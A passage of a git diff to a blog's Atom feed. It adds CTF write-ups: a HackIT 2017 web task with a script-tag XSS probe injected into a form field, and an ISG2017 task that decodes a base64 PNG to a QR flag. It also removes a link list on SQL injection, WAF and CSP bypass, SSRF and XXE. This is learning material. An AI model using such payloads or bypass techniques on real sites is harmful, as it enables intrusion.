@@ -169,6 +169,80 @@
   </entry>
   
   <entry>
+    <title>Hackit2017-H4ck3rM1nd-writeup</title>
+    <link href="http://yoursite.com/2017/08/28/Hackit2017-H4ck3rM1nd-writeup/"/>
+    <id>http://yoursite.com/2017/08/28/Hackit2017-H4ck3rM1nd-writeup/</id>
+    <published>2017-08-28T11:54:28.000Z</published>
+    <updated>2017-08-28T12:40:13.280Z</updated>
+    
+    <content type="html"><![CDATA[<p>跟着wp做的。<br><a id="more"></a></p>
+<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Description: Even hackers want to share their thoughts :)</div><div class="line">Attachment: (none)</div><div class="line">Webpage: http://tasks.ctf.com.ua:13373</div><div class="line">Hint: (none)</div></pre></td></tr></table></figure>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/18.png?raw=true" alt=""></p>
+<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>先看看基本功能。</p>
+<p>注册，需要填写一个secret：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/19.png?raw=true" alt=""></p>
+<p>登陆后：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/20.png?raw=true" alt=""></p>
+<p>可以看一个profile:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/21.png?raw=true" alt=""></p>
+<p>而edit点进去后可以修改about字段。</p>
+<p>查看profile.php源代码，发现有一些提示：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/22.png?raw=true" alt=""></p>
+<p>注意上图，我们在注册时填入的secret是放在input标签里的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Secret: &lt;input id=&quot;secret&quot; name=&quot;secret&quot; value=&quot;mygod&quot; type=&quot;text&quot;/&gt;</div></pre></td></tr></table></figure></p>
+<p>如果我们在注册时填写secret为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;/&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&lt;&quot;</div></pre></td></tr></table></figure></p>
+<p>也许能构造出xss？但很可惜被过滤掉了：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/23.png?raw=true" alt=""></p>
+<p>可以看到<code>&gt;</code>和<code>&lt;</code>都被实体化了。</p>
+<p>回到profile.php，查看edit功能，普通的xss攻击不成功，这里会直接把尖括号直接过滤掉。尝试CSS Injection。</p>
+<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
+<li><a href="https://rioru.github.io/ctf/web/2017/08/27/ctf-writeup-hackit-2017-web200.html" target="_blank" rel="external">CTF Write-Up - HackIT CTF 2017 Web200</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;跟着wp做的。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+      <category term="web" scheme="http://yoursite.com/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ISG2017-赛前练手题—writeup</title>
+    <link href="http://yoursite.com/2017/08/28/ISG2017-%E8%B5%9B%E5%89%8D%E7%BB%83%E6%89%8B%E9%A2%98%E2%80%94writeup/"/>
+    <id>http://yoursite.com/2017/08/28/ISG2017-赛前练手题—writeup/</id>
+    <published>2017-08-28T11:43:46.000Z</published>
+    <updated>2017-08-28T11:53:20.122Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="秘密文件"><a href="#秘密文件" class="headerlink" title="秘密文件"></a>秘密文件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">在某个员工的电脑上发现了一份奇怪的文件，你能找到什么东西吗？</div><div class="line">奇怪的文件(https://play.chinaisg.org/attachment/download/secret.backup)</div></pre></td></tr></table></figure>
+<p>下载下来后打开，看起来是流量包。尾部发现一些base64串。解一下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line">pngdata = <span class="string">"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"</span></div><div class="line"></div><div class="line">f = open(<span class="string">"flag.png"</span>,<span class="string">"wb"</span>)</div><div class="line"></div><div class="line">f.write(base64.b64decode(pngdata))</div><div class="line"></div><div class="line">f.close()</div></pre></td></tr></table></figure></p>
+<p>得到一张二维码，扫后得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ISG&#123;5a9f1ce5c7359a1b1076b5143b946a3b&#125;</div></pre></td></tr></table></figure></p>
+<h1 id="简单的apk"><a href="#简单的apk" class="headerlink" title="简单的apk"></a>简单的apk</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">能够通过APK认证的字符串即为本题flag</div><div class="line"></div><div class="line">下载APK(https://play.chinaisg.org/attachment/download/simple-code.apk)</div></pre></td></tr></table></figure>
+<p>其实这是mobile，干脆写在这里不另开了。用jeb打开，然后发现是kotlin，先果断放弃哈哈哈。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;秘密文件&quot;&gt;&lt;a href=&quot;#秘密文件&quot; class=&quot;headerlink&quot; title=&quot;秘密文件&quot;&gt;&lt;/a&gt;秘密文件&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr
+    
+    </summary>
+    
+      <category term="writeup:MISC" scheme="http://yoursite.com/categories/writeup-MISC/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Hackit2017-Weekands of hacker-writeup</title>
     <link href="http://yoursite.com/2017/08/28/Hackit2017-Weekands-of-hacker-writeup/"/>
     <id>http://yoursite.com/2017/08/28/Hackit2017-Weekands-of-hacker-writeup/</id>
@@ -1207,514 +1281,6 @@
     
     </summary>
     
-    
-  </entry>
-  
-  <entry>
-    <title>Web-Security-Learning</title>
-    <link href="http://yoursite.com/2017/08/19/Web-Security-Learning/"/>
-    <id>http://yoursite.com/2017/08/19/Web-Security-Learning/</id>
-    <published>2017-08-19T02:15:59.000Z</published>
-    <updated>2017-08-27T14:34:59.589Z</updated>
-    
-    <content type="html"><![CDATA[<p>Web-Security-Learning 学习资料<br>8月27日更新：</p>
-<ul>
-<li>新增<a href="https://github.com/CHYbeta/Web-Security-Learning#java-web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1" target="_blank" rel="external">java-web代码审计模块</a></li>
-<li>整合<a href="https://github.com/CHYbeta/Web-Security-Learning#php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1" target="_blank" rel="external">php代码审计模块</a></li>
-<li>新收录文章：<ul>
-<li>XSS；<ul>
-<li><a href="http://blog.rakeshmane.com/2017/08/xssing-web-part-2.html" target="_blank" rel="external">Xssing Web With Unicodes</a></li>
-<li><a href="http://blog.fr1day.me/2016/09/07/XSS_Tricks_from_selfxss_to_your_account/" target="_blank" rel="external">XSS Tricks - 从 Self-XSS 到登录你的账户</a></li>
-<li><a href="https://github.com/wisec/domxsswiki/wiki" target="_blank" rel="external">DOMXSS Wiki</a></li>
-</ul>
-</li>
-<li>java-web；<ul>
-<li><a href="http://mp.weixin.qq.com/s?__biz=MzIzMzgxOTQ5NA==&amp;mid=100000340&amp;idx=1&amp;sn=6ca4ec15ef6338daf1d4a907351d7c08&amp;chksm=68fe9e5d5f89174b44fd0cae2e3d5c0018859d3d1dc6d60a2e16dcde34499ba224d6ea17a982#rd" target="_blank" rel="external">站在Java的视角，深度分析防不胜防的小偷——“XSS” </a></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<a id="more"></a>
-<h1 id="Web-Security-Learning"><a href="#Web-Security-Learning" class="headerlink" title="Web-Security-Learning"></a>Web-Security-Learning</h1><p>项目地址：<a href="https://github.com/CHYbeta/Web-Security-Learning" target="_blank" rel="external">Web-Security-Learning</a></p>
-<h1 id="Web-Security"><a href="#Web-Security" class="headerlink" title="Web Security"></a>Web Security</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="MySql"><a href="#MySql" class="headerlink" title="MySql"></a>MySql</h3><ul>
-<li><a href="http://bobao.360.cn/learning/detail/3804.html" target="_blank" rel="external">MySQL False注入及技巧总结</a></li>
-<li><a href="http://bobao.360.cn/learning/detail/3758.html" target="_blank" rel="external">MySQL 注入攻击与防御</a></li>
-<li><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247484372&amp;idx=1&amp;sn=ffcc51a88c9acf96c312421b75fc2a26&amp;chksm=ec1e33fcdb69baea53838fd545a236c0deb8a42f3b341ee0879c9e4ac9427c2147fab95b6669#rd" target="_blank" rel="external">sql注入学习总结 </a></li>
-<li><a href="http://bobao.360.cn/learning/detail/3801.html" target="_blank" rel="external">SQL注入防御与绕过的几种姿势</a></li>
-<li><a href="http://rcoil.me/2017/05/MySQL%E5%81%8F%E9%97%A8%E6%8A%80%E5%B7%A7/" target="_blank" rel="external">MySQL偏门技巧</a></li>
-<li><a href="http://www.wupco.cn/?p=4117" target="_blank" rel="external">mysql注入可报错时爆表名、字段名、库名</a></li>
-<li><a href="http://www.cnblogs.com/croot/p/3450262.html" target="_blank" rel="external">高级SQL注入:混淆和绕过</a></li>
-</ul>
-<h3 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h3><ul>
-<li><a href="http://fuping.site/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/" target="_blank" rel="external">MSSQL DBA权限获取WEBSHELL的过程 </a></li>
-<li><a href="http://bobao.360.cn/learning/detail/3807.html" target="_blank" rel="external">MSSQL 注入攻击与防御</a></li>
-<li><a href="http://docs.ioin.in/writeup/cert.360.cn/_files_CLR_E5_9C_A8SQL_20Server_E4_B8_AD_E7_9A_84_E5_88_A9_E7_94_A8_E6_8A_80_E6_9C_AF_E5_88_86_E6_9E_90_pdf/index.pdf" target="_blank" rel="external">CLR在SQL Server中的利用技术分析</a></li>
-</ul>
-<h3 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h3><ul>
-<li><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247484788&amp;idx=1&amp;sn=8a53b1c64d864cd01bab095d97a17715&amp;chksm=ec1e355cdb69bc4a2535bc1a053bfde3ec1838d03936ba8e44156818e91bbec9b5b04a744005#rd" target="_blank" rel="external">postgresql数据库利用方式 </a></li>
-<li><a href="http://bobao.360.cn/learning/detail/4135.html" target="_blank" rel="external">PostgreSQL渗透测试指南</a></li>
-</ul>
-<h3 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h3><ul>
-<li><a href="http://www.mottoin.com/94341.html" target="_blank" rel="external">MongoDB安全 – PHP注入检测</a></li>
-</ul>
-<h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><ul>
-<li><a href="https://xianzhi.aliyun.com/forum/read/349.html" target="_blank" rel="external">我的WafBypass之道（SQL注入篇）</a></li>
-<li><a href="http://www.cnblogs.com/xiaozi/p/7275134.html" target="_blank" rel="external">Bypass 360主机卫士SQL注入防御</a></li>
-<li><a href="https://mp.weixin.qq.com/s/ORsciwsBGQJhFdKqceprSw" target="_blank" rel="external">SQL注入之骚姿势小记</a></li>
-<li><a href="http://www.freebuf.com/articles/web/137094.html" target="_blank" rel="external">CTF比赛中SQL注入的一些经验总结 </a></li>
-<li><a href="http://bobao.360.cn/learning/detail/3855.html" target="_blank" rel="external">如何绕过WAF/NGWAF的libinjection实现SQL注入</a></li>
-<li><a href="https://github.com/breakthenet/HackMe-SQL-Injection-Challenges" target="_blank" rel="external">HackMe-SQL-Injection-Challenges
-</a></li>
-<li><a href="https://bbs.ichunqiu.com/thread-25397-1-1.html?from=sec" target="_blank" rel="external">绕过WAF注入</a></li>
-<li><a href="https://bbs.ichunqiu.com/thread-16134-1-1.html?from=sec" target="_blank" rel="external">bypassGET和POST的注入防御思路分享</a></li>
-<li><a href="https://mp.weixin.qq.com/s/hBkJ1M6LRgssNyQyati1ng" target="_blank" rel="external">SQL注入的常规思路及奇葩技巧 </a></li>
-<li><a href="https://www.exploit-db.com/papers/17934/" target="_blank" rel="external">Beyond SQLi: Obfuscate and Bypass</a></li>
-</ul>
-<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ul>
-<li><a href="http://bobao.360.cn/learning/detail/3557.html" target="_blank" rel="external">使用burp macros和sqlmap绕过csrf防护进行sql注入</a></li>
-<li><a href="http://www.zerokeeper.com/web-security/sqlmap-usage-summary.html" target="_blank" rel="external">sqlmap 使用总结 </a></li>
-<li><a href="http://www.lengbaikai.net/?p=110" target="_blank" rel="external">SQLmap tamper脚本注释</a></li>
-<li><a href="http://www.4hou.com/system/6945.html" target="_blank" rel="external">通过Burp以及自定义的Sqlmap Tamper进行二次SQL注入</a></li>
-</ul>
-<h2 id="前端安全"><a href="#前端安全" class="headerlink" title="前端安全"></a>前端安全</h2><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><ul>
-<li><a href="http://bobao.360.cn/learning/detail/3848.html" target="_blank" rel="external">漫谈同源策略攻防</a></li>
-<li><a href="https://lightless.me/archives/review-SOP.html" target="_blank" rel="external">再谈同源策略 </a></li>
-<li><a href="https://xianzhi.aliyun.com/forum/read/1404.html?fpage=4" target="_blank" rel="external">跨域方法总结</a></li>
-<li><a href="http://thief.one/2017/05/31/1/" target="_blank" rel="external">浅谈跨站脚本攻击与防御 </a></li>
-<li><a href="http://www.fooying.com/the-art-of-xss-1-introduction/" target="_blank" rel="external">跨站的艺术-XSS入门与介绍</a></li>
-<li><a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916646.24000001.49.ZP8rXN&amp;articleid=518" target="_blank" rel="external">Content Security Policy 入门教程</a></li>
-<li><a href="http://lorexxar.cn/tags/csp/" target="_blank" rel="external">LoRexxar-CSP</a></li>
-<li><a href="https://xianzhi.aliyun.com/forum/read/196.html?fpage=7" target="_blank" rel="external">XSS小记</a></li>
-<li><a href="https://github.com/wisec/domxsswiki/wiki" target="_blank" rel="external">DOMXSS Wiki</a></li>
-<li><a href="https://xianzhi.aliyun.com/forum/read/536.html?fpage=7" target="_blank" rel="external">XSS Bypass Cookbook</a></li>
-<li><a href="https://xianzhi.aliyun.com/forum/read/1988.html" target="_blank" rel="external">从瑞士军刀到变形金刚—XSS攻击面拓展</a></li>
-<li><a href="http://www.freebuf.com/vuls/142751.html" target="_blank" rel="external">我们要在任何可能的地方测试XSS漏洞 </a></li>
-<li><a href="http://brutelogic.com.br/blog/alternative-javascript-pseudo-protocol/" target="_blank" rel="external">Alternative to Javascript Pseudo-Protocol</a></li>
-<li><a href="http://blog.portswigger.net/2016/12/bypassing-csp-using-polyglot-jpegs.html" target="_blank" rel="external">Bypassing CSP using polyglot JPEGs </a></li>
-<li><a href="http://paper.seebug.org/91/" target="_blank" rel="external">Bypass unsafe-inline mode CSP</a></li>
-<li><a href="https://brutelogic.com.br/blog/chrome-xss-auditor-svg-bypass/" target="_blank" rel="external">Chrome XSS Auditor – SVG Bypass</a></li>
-<li><a href="https://xianzhi.aliyun.com/forum/read/1704.html" target="_blank" rel="external">Cross site scripting payload for fuzzing</a></li>
-<li><a href="http://docs.ioin.in/writeup/wps2015.org/_2016_06_27__E4_B8_8D_E5_B8_B8_E8_A7_81_E7_9A_84xss_E5_88_A9_E7_94_A8_E6_8E_A2_E7_B4_A2_/index.html" target="_blank" rel="external">不常见的xss利用探索</a></li>
-<li><a href="https://bbs.ichunqiu.com/thread-25578-1-1.html?from=sec" target="_blank" rel="external">XSS攻击另类玩法</a></li>
-<li><a href="https://bbs.ichunqiu.com/thread-17500-1-1.html?from=sec" target="_blank" rel="external">XSS易容术—-bypass之编码混淆篇+辅助脚本编写</a></li>
-<li><a href="http://blog.rakeshmane.com/2017/08/xssing-web-part-2.html" target="_blank" rel="external">Xssing Web With Unicodes</a></li>
-<li><a href="https://www.zhihu.com/question/20941818/answer/180842222?utm_source=qq&amp;utm_medium=social" target="_blank" rel="external">Chrome 是怎么过滤反射型 XSS 的呢？</a></li>
-<li><a href="http://blog.fr1day.me/2016/09/07/XSS_Tricks_from_selfxss_to_your_account/" target="_blank" rel="external">XSS Tricks - 从 Self-XSS 到登录你的账户</a></li>
-<li><a href="https://mp.weixin.qq.com/s?__biz=MzU2NjE2NjIxNg==&amp;mid=2247483756&amp;idx=1&amp;sn=96ae19e53426d5088718b6d37996e700&amp;source=41#wechat_redirect" target="_blank" rel="external">Electron hack —— 跨平台 XSS </a></li>
-<li><a href="http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html" target="_blank" rel="external">XSS without HTML: Client-Side Template Injection with AngularJS </a></li>
-<li><a href="https://zhchbin.github.io/2016/04/09/Problems-Caused-by-URL-Redirection/" target="_blank" rel="external">一个URL跳转引发的一系列“惨案” </a></li>
-<li><a href="http://blog.neargle.com/SecNewsBak/drops/%E5%88%A9%E7%94%A8%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87CSP%20form-action%E9%99%90%E5%88%B6.html" target="_blank" rel="external">利用反射型XSS二次注入绕过CSP form-action限制</a></li>
-<li><a href="http://bobao.360.cn/learning/detail/3592.html" target="_blank" rel="external">看我如何挖到GoogleMaps XSS漏洞并获得5000刀赏金</a></li>
-<li><a href="https://blog.doyensec.com/2017/08/03/electron-framework-security.html" target="_blank" rel="external">Modern Alchemy: Turning XSS into RCE</a></li>
-</ul>
-<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><ul>
-<li><a href="https://zhchbin.github.io/2016/01/31/CRLF-Injection-and-Bypass-WAF/" target="_blank" rel="external">CRLF Injection and Bypass Tencent WAF </a></li>
-<li><a href="https://bbs.ichunqiu.com/thread-24127-1-1.html?from=sec" target="_blank" rel="external">用代码来细说Csrf漏洞危害以及防御</a></li>
-<li><a href="https://www.leavesongs.com/PENETRATION/think-about-cookie-form-csrf-protected.html" target="_blank" rel="external">Cookie-Form型CSRF防御机制的不足与反思</a></li>
-<li><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247484126&amp;idx=1&amp;sn=f437882b19bed8d99d0a00938accc0c8&amp;chksm=e89e2a06dfe9a310506419467ada63bee80f10c32267d0b11ea7d1f5491c5afdb344c5dac74e&amp;mpshare=1&amp;scene=23&amp;srcid=0614BOCQBHPjaS2IOtADI3PP#rd" target="_blank" rel="external">关于JSON CSRF的一些思考</a></li>
-</ul>
-<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
-<li><a href="http://paper.seebug.org/130/?from=timeline&amp;isappinstalled=0" target="_blank" rel="external">当代 Web 的 JSON 劫持技巧</a></li>
-</ul>
-<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><ul>
-<li><a href="http://docs.ioin.in/writeup/fuzz.wuyun.org/_src_build_your_ssrf_exp_autowork_pdf/index.pdf" target="_blank" rel="external">Build Your SSRF Exploit Framework SSRF</a></li>
-<li><a href="http://www.freebuf.com/articles/web/20407.html" target="_blank" rel="external">SSRF攻击实例解析</a></li>
-<li><a href="http://www.4o4notfound.org/index.php/author/1/" target="_blank" rel="external">SSRF漏洞分析与利用</a></li>
-<li><a href="https://www.secpulse.com/archives/4747.html" target="_blank" rel="external">SSRF漏洞的挖掘经验</a></li>
-<li><a href="http://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html" target="_blank" rel="external">SSRF漏洞的利用与学习</a></li>
-<li><a href="http://www.freebuf.com/articles/web/135342.html" target="_blank" rel="external">SSRF漏洞中绕过IP限制的几种方法总结</a></li>
-<li><a href="http://bobao.360.cn/learning/detail/3566.html" target="_blank" rel="external">利用ssrf漏洞获取google内部的dns信息</a></li>
-<li><a href="https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/" target="_blank" rel="external">What is Server Side Request Forgery (SSRF)?</a></li>
-<li><a href="http://www.mottoin.com/95734.html" target="_blank" rel="external">DNS Rebinding技术绕过SSRF/代理IP限制</a></li>
-<li><a href="https://phpinfo.me/2017/02/23/1438.html" target="_blank" rel="external">Discuz ssrf漏洞利用的几个python脚本</a></li>
-<li><a href="http://bobao.360.cn/learning/detail/2889.html" target="_blank" rel="external">Discuz X系列门户文章功能SSRF漏洞挖掘与分析</a></li>
-<li><a href="http://blog.feei.cn/ssrf/" target="_blank" rel="external">SSRF to GET SHELL</a></li>
-<li><a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/" target="_blank" rel="external">SSRF Tips</a></li>
-</ul>
-<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><ul>
-<li><a href="http://thief.one/2017/06/20/1/" target="_blank" rel="external">浅谈XXE漏洞攻击与防御</a></li>
-<li><a href="http://www.4o4notfound.org/index.php/archives/29/" target="_blank" rel="external">XXE漏洞分析</a></li>
-<li><a href="http://www.hackersb.cn/hacker/211.html" target="_blank" rel="external">XML实体注入漏洞攻与防</a></li>
-<li><a href="http://uknowsec.cn/posts/notes/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html" target="_blank" rel="external">XML实体注入漏洞的利用与学习</a></li>
-<li><a href="http://le4f.net/post/xxe-injection-attack_and_prevent" target="_blank" rel="external">XXE注入:攻击与防御 - XXE Injection: Attack and Prevent</a></li>
-<li><a href="http://www.mottoin.com/101806.html" target="_blank" rel="external">XXE (XML External Entity Injection) 漏洞实践</a></li>
-<li><a href="https://xianzhi.aliyun.com/forum/read/1837.html" target="_blank" rel="external">黑夜的猎杀-盲打XXE</a></li>
-<li><a href="https://blog.zsec.uk/blind-xxe-learning/" target="_blank" rel="external">Hunting in the Dark - Blind XXE</a></li>
-<li><a href="https://www.sans.org/freading-room/whitepapers/application/hands-on-xml-external-entity-vulnerability-training-module-34397" target="_blank" rel="external">XMLExternal Entity漏洞培训模块</a></li>
-<li><a href="http://www.mottoin.com/86853.html" target="_blank" rel="external">如何挖掘Uber网站的XXE注入漏洞</a></li>
-<li><a href="http://www.mottoin.com/88085.html" target="_blank" rel="external">XXE被提起时我们会想到什么</a></li>
-<li><a href="http://www.mottoin.com/92794.html" target="_blank" rel="external">XXE漏洞的简单理解和测试</a></li>
-<li><a href="http://bobao.360.cn/learning/detail/3841.html" target="_blank" rel="external">XXE漏洞攻防之我见</a></li>
-<li><a href="http://www.91ri.org/17052.html" target="_blank" rel="external">XXE漏洞利用的一些技巧</a></li>
-<li><a href="http://bobao.360.cn/learning/detail/360.html" target="_blank" rel="external">神奇的Content-Type——在JSON中玩转XXE攻击</a></li>
-</ul>
-<h2 id="JSONP注入"><a href="#JSONP注入" class="headerlink" title="JSONP注入"></a>JSONP注入</h2><ul>
-<li><a href="http://www.freebuf.com/articles/web/126347.html" target="_blank" rel="external">JSONP注入解析 </a></li>
-<li><a href="http://blog.knownsec.com/2015/03/jsonp_security_technic/" target="_blank" rel="external">JSONP 安全攻防技术</a></li>
-<li><a href="http://www.cnblogs.com/vimsk/archive/2013/01/29/2877888.html" target="_blank" rel="external">一次关于JSONP的小实验与总结</a></li>
-<li><a href="https://xianzhi.aliyun.com/forum/read/1571.html" target="_blank" rel="external">利用JSONP跨域获取信息</a></li>
-<li><a href="https://segmentfault.com/a/1190000009577990" target="_blank" rel="external">关于跨域和jsonp的一些理解(新手向)</a></li>
-</ul>
-<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><ul>
